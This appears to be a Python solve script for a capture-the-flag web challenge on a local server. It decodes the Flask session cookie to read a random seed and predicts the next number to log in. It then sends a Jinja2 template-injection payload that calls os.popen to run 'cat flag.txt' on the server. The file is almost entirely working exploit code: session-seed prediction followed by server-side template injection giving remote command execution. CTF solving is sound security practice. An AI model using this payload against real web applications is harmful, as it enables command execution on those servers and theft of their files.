import base64
import json
import requests
import random
import regex

URL = "http://127.0.0.1:8969"

# Create a session
session = requests.Session()

# Get session cookie
session.get(URL)
token = session.cookies['session']

# Split the payload from the signature
payload = token.split(".")[0]

# Add padding to the payload, if necessary
payload += '=' * (4 - (len(payload) % 4))

# Decode the payload
decoded_data = base64.urlsafe_b64decode(payload)
session_data = json.loads(decoded_data)

# Extract seed and generate new number
seed = session_data['seed']
random.seed(seed)
next_number = random.randint(0, 100000)

# Part 1 Solve
print("Token: " + token)
print("Next Number: " + str(next_number))

# Log in
session.post(URL + "/api/verify_truth", data={'guess': next_number})
token = session.cookies['session']

print("Logged in token: " + token)

# Part 2 Solve
r = session.get(URL + "/mini?ministry={{cycler.__init__.__globals__.os.popen(request.args.p).read()}}&p=cat%20flag.txt", cookies={'session': token})
flag = regex.findall(r'LNC24{.*}', r.text)[0]

print("Solved: " + flag)
